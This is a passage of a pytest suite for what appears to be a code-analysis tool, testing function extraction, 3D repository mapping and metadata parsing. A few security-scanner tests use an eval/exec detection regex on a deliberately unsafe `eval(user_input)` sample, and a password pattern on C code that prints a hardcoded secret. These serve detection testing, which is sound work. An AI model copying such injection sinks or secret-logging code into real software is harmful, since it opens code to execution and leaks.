
    # 1. Standard Exception -> Returns zeroed Ghost Mass payload
    with patch.object(
        opt_detector,
        "_partition_segments",
        side_effect=ValueError("Catastrophic parsing failure"),
    ):
        result = opt_detector.splice("def foo(): pass", "# Architect: Joe")
        assert result["equations"] == {}, "Fallback did not return an empty equations dict!"
        assert result["logic_density"] == 0.0, "Fallback did not zero out logic density!"
        assert result["metadata"]["ownership"] == "Joe", "Fallback destroyed the Ghost Mass metadata!"

    # 2. TimeoutError -> Hardware Guillotine drops cleanly
    with (
        patch.object(
            opt_detector,
            "_partition_segments",
            side_effect=TimeoutError("Hardware thread timeout exceeded"),
        ),
        pytest.raises(TimeoutError),
    ):
        opt_detector.splice("def foo(): pass", "")


# ==============================================================================
# SPATIAL MAPPER: 3D SPATIAL GEOMETRY & MAPPING
# ==============================================================================


@pytest.fixture
def spatial_mapper():
    """Initializes the 3D mapping engine."""
    return SpatialMapper()


def test_spatial_mapper_magnitude_extraction(spatial_mapper):
    """Proves the engine extracts structural magnitude natively or via fallback telemetry."""
    # 1. Primary: Forensics Dictionary
    assert spatial_mapper._get_magnitude({"forensics": {"structural_mass": 42.0}}) == 42.0

    # 2. Secondary: Processed File Impact
    assert spatial_mapper._get_magnitude({"file_impact": 15.5}) == 15.5

    # 3. Fallback: Raw Function Impact
    assert spatial_mapper._get_magnitude({"sum_fxn_impact": 7.0}) == 7.0


def test_spatial_mapper_deterministic_jitter(spatial_mapper):
    """
    Proves the pseudo-random jitter is perfectly deterministic based on the MD5 hash
    of the filename. This ensures the WebGPU map doesn't mutate on refresh.
    """
    val1 = spatial_mapper._hash_jitter("auth_service", 100.0)
    val2 = spatial_mapper._hash_jitter("auth_service", 100.0)
    val3 = spatial_mapper._hash_jitter("database_service", 100.0)

    assert val1 == val2, "Jitter is not deterministic! The map will warp on reload."
    assert val1 != val3, "Jitter failed to differentiate distinct files!"
    assert -100.0 <= val1 <= 100.0, "Jitter violated its amplitude constraints!"


def test_spatial_mapper_sectorization_and_monolith(spatial_mapper):
    """
    Proves the engine correctly groups files into sector constellations by their
    parent directories, and traps root files in the __monolith__.
    """
    files = [
        {"path": "main.py", "file_impact": 10.0},
        {"path": "src/api.py", "file_impact": 20.0},
        {"path": "src/db.py", "file_impact": 30.0},
        {"path": "tests/e2e/test_auth.py", "file_impact": 5.0},
    ]

    mapped = spatial_mapper.map_repository(files)

    # 1. Verify 3D coordinates were injected into every file
    assert all("pos_x" in f for f in mapped), "Missing X coordinates!"
    assert all("pos_y" in f for f in mapped), "Missing Y coordinates!"
    assert all("pos_z" in f for f in mapped), "Missing Z coordinates!"

    # 2. Verify Sector Assignments
    monolith = [f for f in mapped if f.get("directory_group") == "__monolith__"]
    src_group = [f for f in mapped if f.get("directory_group") == "src"]
    test_group = [f for f in mapped if f.get("directory_group") == "tests/e2e"]

    assert len(monolith) == 1, "Root file evaded the monolith!"
    assert len(src_group) == 2, "Failed to group sibling files into the same sector!"
    assert len(test_group) == 1, "Failed to handle nested directory sectors!"


def test_spatial_mapper_ray_casting_collision_avoidance(spatial_mapper):
    """
    Proves the angular spatial hashing engine prevents massive constellations
    from spawning inside each other (overlapping geometry).
    """
    # Create two astronomically massive stars in different sectors
    files = [
        {"path": "alpha_quadrant/core.py", "file_impact": 10000.0},
        {"path": "beta_quadrant/core.py", "file_impact": 10000.0},
    ]

    mapped = spatial_mapper.map_repository(files)
    f1, f2 = mapped[0], mapped[1]

    # Calculate Euclidean distance between the two supermassive stars (X and Z plane)
    distance = math.hypot(f1["pos_x"] - f2["pos_x"], f1["pos_z"] - f2["pos_z"])

    # Calculate their physical radius footprints
    footprint = spatial_mapper._calculate_spatial_clearance(10000.0)

    # Because of the step_factor (1.5x) in the math engine, the distance between them
    # MUST be significantly larger than a single footprint to prevent a visual crash.
    assert distance > footprint * 1.5, "Ray-Caster failed! Massive constellations are overlapping in 3D space."


def test_spatial_mapper_uses_parent_logger_when_provided():
    """Proves the mapper attaches as a child of a supplied parent logger instead of
    creating its own root-level logger."""
    parent = logging.getLogger("gitgalaxy_parent_test")
    parent.setLevel(logging.DEBUG)

    mapper = SpatialMapper(parent_logger=parent)

    assert mapper.logger.name == "gitgalaxy_parent_test.spatial_mapper"
    assert mapper.logger.level == logging.DEBUG


def test_spatial_mapper_supermassive_sector_registers_in_all_bins(spatial_mapper):
    """
    Proves the spatial-hash registration handles a sector so massive that its
    effective placement radius (post MACRO_STEP_FACTOR) envelops the origin --
    i.e. eff_pr >= dist_to_center for the very first sector placed. This forces
    the "register in every angular bin" branch (as opposed to the normal
    angular-arc calculation), which no other test exercises: every other fixture
    uses a handful of files, never enough for one sector's hull_radius to blow
    past its own distance-to-center.
    """
    # A single sector with enough sibling files that its hull radius
    # (footprint + sqrt(n) * MICRO_SPACING) overtakes CORE_EXCLUSION_RADIUS by
    # more than the MACRO_STEP_FACTOR margin requires.
    files = [{"path": f"monolith/file_{i}.py", "file_impact": 10.0} for i in range(700)]

    mapped = spatial_mapper.map_repository(files)

    # No crash, and every node still got real coordinates -- the actual
    # behavior under test is line coverage of the all-bins registration branch,
    # which has no externally observable side effect beyond "didn't crash and
    # kept placing nodes correctly."
    assert len(mapped) == 700
    assert all("pos_x" in f and "pos_z" in f for f in mapped)


# ==============================================================================
# TEST 13: THE PROSE & SINGULARITY BYPASS
# ==============================================================================
@pytest.mark.smoke
def test_detector_prose_and_empty_bypass():
    """Proves the engine gracefully aborts on Markdown, low confidence, or empty streams."""
    opt_detector = StructuralExtractor("markdown", MOCK_LANG_DEFS)

    # 1. Prose/Confidence Bypass
    res_prose = opt_detector.splice("## Header", "comment", confidence=0.40)
    assert res_prose["logic_density"] == 0.0, "Prose bypass failed to abort on low confidence!"

    # 2. Empty Code Stream Bypass
    splicer_py = StructuralExtractor("python", MOCK_LANG_DEFS)
    res_empty = splicer_py.splice("", "comment")
    assert res_empty["logic_density"] == 0.0, "Empty stream bypass failed to abort!"


# ==============================================================================
# TEST 14: FUNCTION TAXONOMY CLASSIFICATION
# ==============================================================================
def test_detector_function_classification():
    """Proves the engine accurately classifies function textures based on naming heuristics."""
    opt_detector = StructuralExtractor("python", MOCK_LANG_DEFS)
    code = (
        "def handle_click_event():\n    pass\n"
        "def parse_raw_text():\n    pass\n"
        "def is_valid_user():\n    pass\n"
        "def test_identity():\n    pass\n"
        "def generate_uuid():\n    pass\n"
    )
    res = opt_detector.splice(code, "")

    types = {f["name"]: f["type_id"] for f in res["functions"]}
    assert types.get("handle_click_event") == "event", "Failed to classify 'handle' as event!"
    assert types.get("parse_raw_text") == "logic", "Failed to classify 'parse' as logic!"
    assert types.get("is_valid_user") == "check", "Failed to classify 'is_' as check!"
    assert types.get("test_identity") == "verification", "Failed to classify 'test' as verification!"
    assert types.get("generate_uuid") == "standard", "Failed to fallback to standard taxonomy!"


# ==============================================================================
# TEST 15: RUBY SHIELDS & MAKEFILE NAME EXTRACTION
# ==============================================================================
def test_detector_ruby_literals_and_makefile_extraction():
    """Proves Ruby % literals are shielded and Makefile variables are extracted correctly."""
    # 1. Ruby % literals
    splicer_rb = StructuralExtractor("ruby", MOCK_LANG_DEFS)
    ruby_code = "def foo\n  x = %q{this is a string}\n  y = %W[a b c]\nend"
    safe_ruby = splicer_rb._apply_literal_shield(ruby_code, "ruby")
    assert "%q{" not in safe_ruby, "Failed to shield Ruby %q literal!"

    # 2. Makefile Name Extraction
    splicer_make = StructuralExtractor("makefile", MOCK_LANG_DEFS)
    name = splicer_make._extract_name("$(TARGET):")
    assert name == "$(TARGET)", "Makefile shield failed to preserve $(...) syntax!"

    # 3. C-Style ARGS Shield
    splicer_c = StructuralExtractor("c", MOCK_LANG_DEFS)
    c_name = splicer_c._extract_name("void my_func ARGS1(int x) {")
    assert c_name == "my_func", "C-Style ARGS macro shield failed!"


# ==============================================================================
# TEST 16: MISSING DEPENDENCY FALLBACKS
# ==============================================================================
@patch("gitgalaxy.core.detector.HAS_TIKTOKEN", False)
def test_detector_missing_tiktoken_fallback():
    """Proves the engine won't crash or poison datasets if tiktoken is missing."""
    opt_detector = StructuralExtractor("python", MOCK_LANG_DEFS)
    res = opt_detector.splice("def foo(): pass", "")

    assert res["token_mass"] is None, "Fallback failed to return None for token mass!"
    assert res["financial_read_cost"] is None, "Fallback failed to neutralize financial cost!"


# ==============================================================================
# TEST 17: MODE E (EXOTIC TERMINATOR CLEAVING)
# ==============================================================================
def test_detector_mode_e_erlang_cleaving():
    """Proves Mode E correctly chops Erlang/Prolog using terminators (.) instead of braces."""
    # Inject temporary Erlang config into the mock
    MOCK_LANG_DEFS["erlang"] = {
        "lexical_family": "c_style_comment",
        "rules": {"func_start": re.compile(r"^[a-z_][a-zA-Z0-9_]*\s*(?:\(|->)", re.M)},
    }
    opt_detector = StructuralExtractor("erlang", MOCK_LANG_DEFS)
    code = "server_loop() ->\n    receive\n        msg -> ok\n    end.\n\nshutdown() ->\n    halt.\n"

    with patch("gitgalaxy.core.detector.ScopeParsingRegistry.get_mode", return_value="mode_e"):
        result = opt_detector.splice(code, "")

    assert len(result["functions"]) == 2, "Mode E failed to cleave Erlang blocks!"
    names = [f["name"] for f in result["functions"]]
    assert "server_loop" in names
    assert "shutdown" in names


# ==============================================================================
# TEST 18: APPSEC RCE FUNNEL AMPLIFICATION
# ==============================================================================
def test_detector_appsec_rce_funnel_amplification():
    """Proves the AppSec sensor detects and mathematically multiplies RCE funnel threats."""
    opt_detector = StructuralExtractor("python", MOCK_LANG_DEFS)
    # Inject the AppSec sensor rule dynamically
    opt_detector.primary_rules["rce_funnel"] = re.compile(r"\b(eval|exec)\b")

    code = "def malicious_funnel(user_input):\n    eval(user_input)\n"
    result = opt_detector.splice(code, "")

    # A single hit is multiplied by 50 in the spatial correlation matrix
    assert result["equations"].get("rce_funnel", 0) >= 50, "AppSec Sensor failed to amplify the RCE Funnel penalty!"


# ==============================================================================
# TEST 19: HARDWARE GUILLOTINE (REGEX CATCH BLOCK)
# ==============================================================================
def test_detector_regex_execution_catch_block():
    """Proves the engine survives a catastrophic regex execution failure during coding analysis."""
    opt_detector = StructuralExtractor("python", MOCK_LANG_DEFS)

    # Create a mock regex object that natively explodes to bypass C-immutability limits
    class ExplodingRegex:
        pattern = "explode"

        def finditer(self, text):
            raise ValueError("Simulated C-Engine Crash")

    # Inject the exploding regex into the primary rules
    opt_detector.languages["python"]["rules"]["branch"] = ExplodingRegex()

    # Run a splice that would normally trigger the 'branch' and 'func_start' rules
    result = opt_detector.splice("def foo():\n    if True:\n        pass\n", "")

    # The engine should catch the crash on the 'branch' rule, log it, and gracefully continue.
    # It shouldn't crash the pipeline, and other rules (like func_start) should still process perfectly.
    assert len(result["functions"]) == 1, "Engine failed to continue parsing after a single regex rule crashed!"
    assert result["equations"].get("branch", 0) == 0, "Exploded rule somehow returned hits!"


# ==============================================================================
# TEST 20: MODE B LISP-FAMILY PARSING (Parenthesis Scoping)
# ==============================================================================
def test_detector_mode_b_lisp_family():
    """Proves Mode B correctly swaps from {} to () for Lisp/Scheme/Clojure languages.

    BUG FIX (2026-08-20): this used to key off a hardcoded `lang_id == "lisp"` string match,
    but "lisp" was never a real key in LANGUAGE_DEFINITIONS (only "scheme" is) -- that branch
    was unreachable dead code in production, and this mock's own `lexical_family` value
    ("lisp_style") was never actually consulted by the old check, so the test was passing for
    the wrong reason. `_slice_by_braces` now keys off `lexical_family` instead; the mock below
    uses "recursive_block_lisp", scheme's real value, so this test validates the actual
    production mechanism.
    """
    MOCK_LANG_DEFS["lisp"] = {
        "lexical_family": "recursive_block_lisp",
        "rules": {"func_start": re.compile(r"^\s*\(\s*defun\s+([a-zA-Z0-9_.-]+)", re.M)},
    }
    opt_detector = StructuralExtractor("lisp", MOCK_LANG_DEFS)
    code = "(defun calculate-total (x y)\n  (+ x y))\n\n(defun isolate-logic ()\n  (print 'done'))\n"

    result = opt_detector.splice(code, "")

    assert len(result["functions"]) == 2, "Failed to cleave Lisp-family parenthesis scopes!"
    names = [f["name"] for f in result["functions"]]
    assert "calculate-total" in names
    assert "isolate-logic" in names


# ==============================================================================
# TEST 21: DECOUPLED COMMENT ANALYSIS (Tech Debt & Graveyards)
# ==============================================================================
def test_detector_comment_analysis_math():
    """Proves the engine accurately tallies structural debt from the isolated comment stream."""
    opt_detector = StructuralExtractor("python", MOCK_LANG_DEFS)

    # Inject comment rules
    opt_detector.primary_rules["planned_debt"] = re.compile(r"\bTODO\b")
    opt_detector.primary_rules["dead_code"] = re.compile(r"^#\s*def\s", re.M)

    comment_stream = "# TODO: Refactor this entire class\n# def old_abandoned_function():\n#     pass\n"

    # Pass an empty equations dict to simulate the handoff from coding_analysis
    equations = {"planned_debt": 0, "dead_code": 0}
    result = opt_detector.comment_analysis(comment_stream, "python", equations)

    assert result["planned_debt"] == 1, "Failed to tally planned tech debt from comments!"
    assert result["dead_code"] == 1, "Failed to tally graveyard (dead code) from comments!"


# ==============================================================================
# TEST 22: EXPLICIT TAXONOMY OVERRIDES
# ==============================================================================
def test_detector_explicit_type_override():
    """Proves the @gal_type decorator overrides standard naming heuristics."""
    opt_detector = StructuralExtractor("python", MOCK_LANG_DEFS)
    code = "def fetch_data():\n    # @gal_type: cryptography\n    return encrypt(data)\n"

    result = opt_detector.splice(code, "")
    func = result["functions"][0]

    # 'fetch' normally classifies as 'io', but the tag should force it to 'cryptography'
    assert func["type_id"] == "cryptography", "Failed to apply explicit @gal_type override!"


# ==============================================================================
# TEST 23: APPSEC ACTIVE HEMORRHAGE SENSOR (RELOCATED, #348)
# ==============================================================================
def test_detector_active_hemorrhage_leak_no_longer_lives_in_detector():
    """
    "The Active Hemorrhage" (secrets correlated with a logging/print sink) has
    moved out of detector.py entirely (#348): its target key,
    "sec_hardcoded_secrets", is the Passive Security Lens Observer name, only
    ever populated by security_lens.py in galaxyscope.py's Phase 5.5 -- data
    that structurally cannot exist yet at the point detector.py's
    coding_analysis() runs. The real, working amplification now lives in
    galaxyscope.py's post-hoc correlation step; see
    test_galaxyscope.py::test_worker_amplifies_active_hemorrhage_post_hoc.

    This test only proves detector.py itself no longer touches this key at
    all -- injecting a fake "sec_hardcoded_secrets" rule directly (as the old
    version of this test did) now just produces a raw, unamplified count.
    """
    opt_detector = StructuralExtractor("c", MOCK_LANG_DEFS)

    opt_detector.primary_rules["sec_hardcoded_secrets"] = re.compile(r"password")
    opt_detector.primary_rules["telemetry"] = re.compile(r"console\.log|printf")

    code = (
        "void log_credentials() {\n"
        "    char* password = 'super_secret'; // Trigger: sec_private_info\n"  # gitleaks:allow
        "    printf(password);                // Trigger: telemetry (sink)\n"
        "}\n"
    )

    result = opt_detector.splice(code, "")

    assert result["equations"].get("sec_hardcoded_secrets", 0) == 2, (
        "detector.py should report only the raw, unamplified hit count (2x 'password') -- "
        "amplification is no longer computed here at all"
    )
    assert result["mitigation_telemetry"].get("amplified_leaks", 0) == 0


# ==============================================================================
# TEST 24: HARVEST ABOVE (GHOST TETHER) & CLASS LINEAGE
# ==============================================================================
def test_detector_harvest_above_and_lineage():
    """Proves the engine can harvest comments sitting ABOVE a function/class, and extract inheritance."""
    opt_detector = StructuralExtractor("c", MOCK_LANG_DEFS)

    # Inject a 2-group regex to trigger the inheritance lineage extractor
    opt_detector.languages["c"]["rules"]["class_start"] = re.compile(r"class\s+(\w+)(?:\s*:\s*public\s+(\w+))?")

    code = (
        "// Architect: Bob\n"
        "class MyDerivedClass : public MyBaseClass {\n"
        "}\n"
        "\n"
        "// This is a C++ function comment\n"
        "void do_something() {\n"
        "}\n"
    )

    # Pass raw_content to enable spatial Ghost Tether mapping
    result = opt_detector.splice(code, code, raw_content=code)

    # Verify Lineage Extraction (Capture Group 2)
    assert "MyBaseClass" in result["metadata"].get("parent_entity", ""), "Failed to extract class inheritance lineage!"

    # Verify Harvest Above
    # We must find the extracted function block and check its docstring
    extracted_docs = [f["docstring"] for f in result["functions"] if "C++ function comment" in f.get("docstring", "")]
    assert len(extracted_docs) > 0, "Failed to harvest comments sitting ABOVE the block!"


# ==============================================================================
# TEST 25: MULTI-LINE MACRO CONTINUATIONS (MODE B)
# ==============================================================================
def test_detector_mode_b_multiline_macros():
    """Proves the C-Family preprocessor shield correctly handles backslash continuations to protect scope."""
    opt_detector = StructuralExtractor("c", MOCK_LANG_DEFS)
    code = (
        "#define COMPLICATED_MACRO(x) \\\n"
        "    if (x) { \\\n"
        '        printf("Unbalanced brace!"); \\\n'
        "\n"
        "void normal_function() {\n"
        "    int y = 1;\n"
        "}\n"
    )

    result = opt_detector.splice(code, "")

    # If the preprocessor shield fails, the unbalanced '{' inside the macro
    # will destroy the structural parsing of 'normal_function'.
    names = [f["name"] for f in result["functions"]]
    assert "normal_function" in names, "Pre-processor shield failed to protect scope from multi-line macros!"


# ==============================================================================
# TEST 26: GLOBAL DUST (MODE D) & UNTERMINATED BLOCKS (MODE E)
# ==============================================================================
def test_detector_global_dust_and_unterminated():
    """Proves the engine captures trailing/floating code outside of valid scope boundaries."""
    # 1. Mode D: Global Dust (Ruby)
    opt_detector_rb = StructuralExtractor("ruby", MOCK_LANG_DEFS)
    ruby_code = "puts 'This is global dust'\ndef standard_func\n    x = 1\nend\nputs 'This is trailing dust'\n"
    res_rb = opt_detector_rb.splice(ruby_code, "")
    names_rb = [f["name"] for f in res_rb["functions"]]

    assert "__global_context__" in names_rb, "Mode D failed to aggregate global dust into a block!"
    assert "standard_func" in names_rb

    # 2. Mode E: Unterminated Block (SQL without a semicolon)
    opt_detector_sql = StructuralExtractor("sql", MOCK_LANG_DEFS)
    sql_code = "SELECT * FROM forgotten_table WHERE id = 1"

    with patch("gitgalaxy.core.detector.ScopeParsingRegistry.get_mode", return_value="mode_e"):
        res_sql = opt_detector_sql.splice(sql_code, "")

    names_sql = [f["name"] for f in res_sql["functions"]]
    assert any("[Unterminated]" in n for n in names_sql), "Mode E failed to rescue an unterminated SQL block!"


# ==============================================================================
# TEST 27: MULTI-LINE METADATA BLOCK PARSING
# ==============================================================================
def test_detector_metadata_block_parsing():
    """Proves the comment decoder handles multi-line purpose blocks using boundaries."""
    opt_detector = StructuralExtractor("python", MOCK_LANG_DEFS)

    # Inject block-level rules
    opt_detector.primary_rules["_meta_purpose_block"] = re.compile(r"^Purpose:")
    opt_detector.primary_rules["_meta_boundary"] = re.compile(r"^\-\-\-")

    comment_stream = (
        "# Purpose:\n# This is line 1 of the purpose.\n# This is line 2.\n# ---\n# Some other ignored comment.\n"
    )

    meta = opt_detector._decode_comment_stream(comment_stream)

    assert "line 1" in meta.get("purpose", ""), "Failed to read block metadata!"
    assert "line 2" in meta.get("purpose", ""), "Failed to continue reading block metadata!"
    assert "ignored" not in meta.get("purpose", ""), "Failed to stop at the boundary marker!"


def test_detector_metadata_block_terminates_on_trailing_blank_line():
    """
    A blank line AFTER block text has started ends the block (break), with
    no boundary marker needed at all -- distinct from the leading-blank-line
    case below, which must be skipped rather than ending the block early.
    """
    opt_detector = StructuralExtractor("python", MOCK_LANG_DEFS)
    opt_detector.primary_rules["_meta_purpose_block"] = re.compile(r"^Purpose:")
    opt_detector.primary_rules["_meta_boundary"] = None

    comment_stream = "# Purpose:\n# Real purpose text.\n#\n# Some other ignored comment.\n"
    meta = opt_detector._decode_comment_stream(comment_stream)

    assert "Real purpose text" in meta.get("purpose", "")
    assert "ignored" not in meta.get("purpose", ""), (
        "A trailing blank line should end the block, not just the boundary marker!"
    )


def test_detector_metadata_block_skips_leading_blank_lines():
    """A blank line BEFORE any block text has appeared is skipped, not treated as end-of-block."""
    opt_detector = StructuralExtractor("python", MOCK_LANG_DEFS)
    opt_detector.primary_rules["_meta_purpose_block"] = re.compile(r"^Purpose:")
    opt_detector.primary_rules["_meta_boundary"] = None

    comment_stream = "# Purpose:\n#\n# Real purpose text, after a leading blank line.\n"
    meta = opt_detector._decode_comment_stream(comment_stream)

    assert "Real purpose text" in meta.get("purpose", ""), (
        "A leading blank line inside the block should be skipped, not end the block before any text was captured!"
    )


def test_detector_metadata_single_line_purpose_continuation():
    """
    Single-line `Purpose: ...` metadata (not a block) continues accumulating
    unrelated-looking comment lines into a fallback buffer until a blank
    line, a boundary marker, or a block-purpose marker ends it.
    """
    opt_detector = StructuralExtractor("python", MOCK_LANG_DEFS)
    # _meta_purpose_block is deliberately cleared: MOCK_LANG_DEFS is a shared
    # module-level dict and primary_rules is a reference into it, not a copy
    # -- an earlier test in this file sets _meta_purpose_block, which would
    # otherwise leak in here and hijack "Purpose:" into the block branch
    # instead of the single-line branch this test targets.
    opt_detector.primary_rules["_meta_purpose_block"] = None
    opt_detector.primary_rules["_meta_boundary"] = re.compile(r"^\-\-\-")

    comment_stream = "# Purpose: Does the thing.\n# And continues here.\n# ---\n# Not part of it.\n"
    meta = opt_detector._decode_comment_stream(comment_stream)

    purpose = meta.get("purpose", "")
    assert "Does the thing" in purpose
    assert "continues here" in purpose, "Single-line purpose continuation lines should accumulate!"
    assert "Not part of it" not in purpose, "Continuation should stop at the boundary marker!"


def test_detector_metadata_single_line_purpose_terminates_on_blank_line():
    """Same single-line continuation, but terminated by a blank line instead of a boundary."""
    opt_detector = StructuralExtractor("python", MOCK_LANG_DEFS)
    opt_detector.primary_rules["_meta_purpose_block"] = None  # see comment above
    opt_detector.primary_rules["_meta_boundary"] = None

    comment_stream = "# Purpose: Does the thing.\n#\n# Not part of it.\n"
    meta = opt_detector._decode_comment_stream(comment_stream)

    purpose = meta.get("purpose", "")
    assert "Does the thing" in purpose
    assert "Not part of it" not in purpose, "A blank line should terminate single-line purpose continuation!"


# ==============================================================================
# TEST 28: AUTO-HEAL BOOTLOADER
# ==============================================================================
def test_detector_auto_heal_bootloader():
    """Proves the detector attempts to auto-heal by dynamically importing LANGUAGE_DEFINITIONS."""
    # Pass an empty language definition dictionary to trigger the heal
    try:
        opt_detector = StructuralExtractor("python", {})
        # If gitgalaxy is in the PYTHONPATH during testing, it will heal and find the rules
        assert "rules" in opt_detector.languages.get("python", {}) or opt_detector.primary_lang_id == "unknown", (
            "Auto-heal bootloader failed to trigger!"
        )
    except Exception as e:
        pytest.fail(f"Auto-heal bootloader crashed instead of healing: {e}")


# ==============================================================================
# TEST 29: EMBEDDED LANGUAGE PARTITIONING (THE HANDSHAKE STACK)
# ==============================================================================
def test_detector_embedded_language_partitioning():
    """Proves the engine dynamically swaps languages mid-file when it hits an embedded handshake."""
    # Inject a temporary mock definition for javascript
    MOCK_LANG_DEFS["javascript"] = {
        "lexical_family": "c_style_comment",
        "rules": {"func_start": re.compile(r"function\s+([a-zA-Z0-9_]+)\s*\("), "branch": re.compile(r"\bif\b")},
    }

    # We scan an HTML file, but the handshake should route the <script> block to JS
    opt_detector = StructuralExtractor("html", MOCK_LANG_DEFS)

    code = (
        "<html>\n"
        "<body>Hello</body>\n"
        "<script>\n"
        "function hidden_alien_logic() {\n"
        "    if (true) { return 1; }\n"
        "}\n"
        "</script>\n"
        "</html>"
    )

    result = opt_detector.splice(code, "")

    # The detector should have found the JS function inside the HTML file
    assert len(result["functions"]) == 1, "Failed to partition and extract embedded language logic!"
    assert result["functions"][0]["name"] == "hidden_alien_logic", "Failed to extract embedded function name!"
    assert result["equations"].get("branch", 0) == 1, "Failed to apply embedded language regex rules!"


# ==============================================================================
# TEST 30: EXOTIC SEMANTIC EXTRACTION (LUA, ELIXIR, VB)
# ==============================================================================
def test_detector_exotic_semantic_names():
    """Proves the semantic name extractor correctly parses Lua, Elixir, and Visual Basic signatures."""
    opt_detector = StructuralExtractor("unknown", MOCK_LANG_DEFS)

    # Lua
    lua_name = opt_detector._extract_semantic_name("function calculate_physics()", "lua")
    assert lua_name == "calculate_physics", "Failed to extract Lua function name!"

    # Elixir
    elixir_name = opt_detector._extract_semantic_name("defmodule Galaxy.Engine do", "elixir")
    assert elixir_name == "Galaxy.Engine", "Failed to extract Elixir module name!"

    # Visual Basic
    vb_name = opt_detector._extract_semantic_name("Public Sub ExecuteMission()", "vb")
    assert vb_name == "ExecuteMission", "Failed to extract Visual Basic Sub name!"


# ==============================================================================
# TEST 31: SPATIAL CORRELATION EDGE CASES
# ==============================================================================
def test_detector_correlation_edge_cases():
    """Proves the AppSec correlation engine safely handles empty threat vectors without crashing."""
    opt_detector = StructuralExtractor("c", MOCK_LANG_DEFS)

    # Case 1: Empty Targets (No initial threat found)
    unmitigated, mitigated = opt_detector._correlate_signals(targets=[], dampeners=[100, 200])
    assert unmitigated == 0 and mitigated == 0, "Correlation failed on empty targets!"

    # Case 2: Empty Dampeners (Threat found, but no safety mechanism exists)
    unmitigated, mitigated = opt_detector._correlate_signals(targets=[50, 150], dampeners=[])
    assert unmitigated == 2 and mitigated == 0, "Correlation failed to flag unmitigated threats!"


# ==============================================================================
# TEST 32: ALIEN RULE DIAGNOSTICS
# ==============================================================================
def test_detector_unregistered_rule_handling(caplog):
    """Proves the engine safely ignores unregistered regex rules without polluting the schema."""
    MOCK_LANG_DEFS["alien_lang"] = {
        "lexical_family": "single_line_only",
        "rules": {"rogue_unregistered_rule": re.compile(r"alien_syntax")},
    }

    opt_detector = StructuralExtractor("alien_lang", MOCK_LANG_DEFS)

    with caplog.at_level(logging.WARNING):
        result = opt_detector.splice("alien_syntax is here", "")

    # The rule should NOT exist in the final equations output, preserving schema integrity
    assert "rogue_unregistered_rule" not in result["equations"], "Schema polluted by unregistered rule!"

    # The engine should have logged a diagnostic warning
    assert "Unregistered rule" in caplog.text, "Failed to log diagnostic warning for alien rule!"


# ==============================================================================
# TEST 33: CARTOGRAPHY EMPTY STATES & FALLBACKS
# ==============================================================================
def test_spatial_mapper_empty_states_and_fallbacks():
    """Proves the 3D geometry engine handles missing files and zero-magnitude states safely."""
    mapper = SpatialMapper()

    # Case 1: Empty Repository
    assert mapper.map_repository([]) == [], "Spatial Mapper crashed on an empty repository!"

    # Case 2: Empty Hash Jitter
    assert mapper._hash_jitter("", 100.0) == 0.0, "Jitter failed to neutralize empty seeds!"

    # Case 3: Zero Magnitude Fallback
    assert mapper._get_magnitude({}) == 0.0, "Magnitude extraction crashed on an empty node dictionary!"

    # Case 4: Deep Fallback (Using total_control_flow_ratio as a mock fallback if needed)
    assert mapper._get_magnitude({"sum_fxn_impact": 0.0}) == 0.0, "Magnitude extraction failed on zero-impact nodes!"


# ==============================================================================
# TEST 34: UTILITY & EMPTY STATE FALLBACKS
# ==============================================================================
def test_detector_utility_empty_states():
    """Proves utility functions safely handle None/empty values."""
    from gitgalaxy.core.detector import get_token_mass

    assert get_token_mass(None) == 0
    assert get_token_mass("") == 0

    opt = StructuralExtractor("python", MOCK_LANG_DEFS)
    assert opt._extract_semantic_name("just some random text", "ruby") == "Anonymous_Block"


# ==============================================================================
# TEST 35: UNBALANCED SCOPES & EXTREME SHIELDS
# ==============================================================================
def test_detector_unbalanced_and_extreme_shields(caplog):
    """Proves the engine handles unbalanced braces and massive file warnings."""
    opt = StructuralExtractor("c", MOCK_LANG_DEFS)

    # 1. Unbalanced End (No closing brace available in the string)
    idx = opt._find_balanced_end("int main() { printf('hi'); ", 11, "{", "}")
    assert idx == len("int main() { printf('hi'); "), "Failed to break on missing closer!"

    # 2. Massive string warning (> 500,000 chars) to trigger the safety log
    massive_text = "A" * 500001
    with caplog.at_level(logging.WARNING):
        opt._apply_literal_shield(massive_text, "c")
    assert "Extremely long block" in caplog.text, "Failed to log diagnostic warning for massive payloads!"


# ==============================================================================
# TEST 36: DEFENSIVE EXCEPTIONS (CATCH BLOCKS)
# ==============================================================================
def test_detector_defensive_catch_blocks(caplog):
    """Proves the deep regex exception catch blocks prevent pipeline crashes."""
    opt = StructuralExtractor("python", MOCK_LANG_DEFS)

    # 1. coding_analysis catch block
    class ExplodingPattern:
        pattern = "explode"

        def finditer(self, text):
            raise RuntimeError("Coding Analysis Crash")

    opt.languages["python"]["rules"]["branch"] = ExplodingPattern()

    with caplog.at_level(logging.ERROR):
        opt.coding_analysis([("python", "if True:", 0)])

    assert "Regex failure in rule" in caplog.text, "Engine failed to catch and log coding analysis crash!"

    # 2. comment_analysis catch block
    class ExplodingCommentPattern:
        def findall(self, text):
            raise RuntimeError("Comment Analysis Crash")

    opt.languages["python"]["rules"]["planned_debt"] = ExplodingCommentPattern()

    with caplog.at_level(logging.ERROR):
        opt.comment_analysis("TODO: fix", "python", {"planned_debt": 0})

    assert "Comment stream regex failure" in caplog.text, "Engine failed to catch and log comment analysis crash!"


# ==============================================================================
# TEST 37: EMPTY PATTERN CONTINUATIONS
# ==============================================================================
def test_detector_empty_pattern_continuations():
    """Proves that empty or malformed regex patterns are skipped safely."""
    opt = StructuralExtractor("python", MOCK_LANG_DEFS)

    # Inject explicitly empty and null patterns
    opt.languages["python"]["rules"]["empty_rule_1"] = re.compile(r"")
    opt.languages["python"]["rules"]["empty_rule_2"] = re.compile(r"()")
    opt.languages["python"]["rules"]["none_rule"] = None

    # This should run without accumulating any hits and without crashing
    counts, _, _, _, _ = opt.coding_analysis([("python", "code", 0)])

    assert counts.get("empty_rule_1", 0) == 0, "Empty rule falsely triggered a hit!"


# ==============================================================================
# TEST 38: RUBY INLINE MODIFIER (ASSIGNMENT BRANCH)
# ==============================================================================
def test_detector_ruby_inline_assignment_branch():
    """Proves the Ruby mode D scanner handles inline modifiers attached to assignments."""
    opt = StructuralExtractor("ruby", MOCK_LANG_DEFS)

    code = (
        "def test_assignment\n"
        "  x = if condition\n"  # This specific assignment syntax triggers a distinct IF-branch in Mode D
        "    1\n"
        "  end\n"
        "end\n"
    )
    result = opt.splice(code, "")

    assert len(result["functions"]) == 1, "Failed to parse inline assignment modifier block!"
    assert result["functions"][0]["name"] == "test_assignment"


# ==============================================================================
# TEST 39: MEMORY ALLOCATION (NO CLEANUP)
# ==============================================================================
